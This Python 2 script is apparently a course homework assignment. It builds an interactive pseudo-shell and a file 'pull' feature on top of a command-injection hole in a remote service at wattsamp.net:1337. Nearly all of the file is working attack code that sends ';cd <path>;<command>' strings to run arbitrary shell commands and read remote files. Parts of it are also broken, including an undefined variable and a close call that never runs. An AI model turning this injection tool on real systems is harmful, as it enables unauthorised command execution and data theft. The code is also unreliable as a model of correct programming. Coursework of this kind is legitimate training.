"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import re
import time
import sys

host = "wattsamp.net" # IP address here
port = 1337 # Port here
path_cd = "/"

#if the cmd is cd see how to return pwd back to calling function
def execute_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(1)
    data = s.recv(1024)
    while ':' not in data:
        data+=s.recv(1024)
    #print data
    strtosend=';cd '+path_cd+';'+cmd+'\n'
    s.send(strtosend)
    #print strtosend
    time.sleep(1)
    response=s.recv(4000)
    print response
    split_cmd=re.split(" ",cmd)
    if "cd" == split_cmd[0]:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))

         #print "so i'm in cd\n"#testing
         time.sleep(1)
         data = s.recv(1024)
         #print "the data i recieved is "+ data
         if len(split_cmd) == 2:
            #print "2 args version"
            s.send(";cd "+ path_cd +" ;cd "+split_cmd[1]+" ;pwd\n")
         elif len(split_cmd)==1:
            s.send(";cd " + path_cd + " ;cd;pwd\n")
         else:
            s.send(";pwd\n")
         #print "i asked for pwd after changing directory\n" #testing
         time.sleep(2)
         resp=s.recv(1024)
         #print "did i recieve a response "+resp.rstrip()+"."
         global path_cd
         path_cd=resp.rstrip()
         print path_cd


        #for the pull cmd cat the file then use file I/O to open new file with that content


        #cmd_insplit=re.split(" ",cmd)
        #if len(cmd_insplit) = 2:
        #    path_cd= cmd_insplit[1] #do pwd to find path

    s.close
    """
        Sockets: https://docs.python.org/3/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    #print("IMPLEMENT ME")


if __name__ == '__main__':
    """execute_cmd("ls")"""
    #a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #a.connect((host, port))
    usr_in=""
    in_shell= False
    #cd_loc=""
    while True:
        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a.connect((host, port))
        #if in_shell == True:
        #else:
        print "\n> "
        usr_in=raw_input()
        cmd_in_parts=re.split(" ",usr_in)
        #print "Usr input is"+usr_in
        if cmd_in_parts[0] == "shell":
            #input=""
            #while input != "exit":
            #print "in shell\n" #testing
            if len(cmd_in_parts) !=1:
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"
            else:
                in_shell = True
                input=""
                while input!= "exit":
                    if path_cd=="":
                        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        a.connect((host, port))
                        #print "so i'm in shell\n"#testing
                        time.sleep(1)
                        data = a.recv(1024)
                        #print "the data i recieved is "+ data
                        a.send(";pwd\n")
                        #print "i asked for pwd\n" #testing
                        time.sleep(2)
                        resp=a.recv(1024)
                       # print "did i recieve a response " +resp.rstrip()+"."
            #print "\n"+ resp+ "\n"
                        prompt="\n"+resp.rstrip()+"> "
                        print prompt
                    else:
                        prompt="\n"+path_cd+"> "
                        print prompt
                    input=raw_input()
                    execute_cmd(input)
                    #print "out shell\n" #testing
            ###add check in case extra elements
            '''if len(cmd_in_parts) != 1:
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"
            else:
                in_shell = False'''

        elif cmd_in_parts[0]== "help":
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"
            ###add check in case extra element
        elif cmd_in_parts[0] == "pull":
            print "given pull\n" #testing
            if len(cmd_in_parts) == 3:
                print "cmd good\n" #testing
                #execute scp or something here idk
                #execute_cmd("scp "+cmd_split[1]+" "+cmd_split[2])
                #print "so i'm in shell\n"#testing
                time.sleep(1)
                data = a.recv(1024)
                #print "the data i recieved is "+ data
                a.send(";cat "+cmd_split[1])
                #print "i asked for cat remote path\n" #testing
                time.sleep(2)
                resp=a.recv(1024)
                #print "did i recieve a response " +resp.rstrip()+"."
                ogstdout=sys.stdout
                sys.stdout=open(cmd_split[2],'w')
                print resp.rstrip()
                sys.stdout.close()
                sys.stdout=ogstdout
            else:
                print "cmd bad\n" #testing
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"
                
        #how to determine that a command is malformed (which commands are we looking for)
        #how to do pull? use ftp, scp, what???????a
        elif cmd_in_parts[0] == "quit":
            if len(cmd_in_parts)== 1:
                sys.exit()
            else:
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"

        else: #execute command
                print "1. shell Drop into an interactive shell and allow users to gracefully exit \n"
                print "2. pull <remote-path> <local-path> Download files \n"
                print "3. help Shows this help menu \n"
                print "4. quit Quit the shell \n"
        
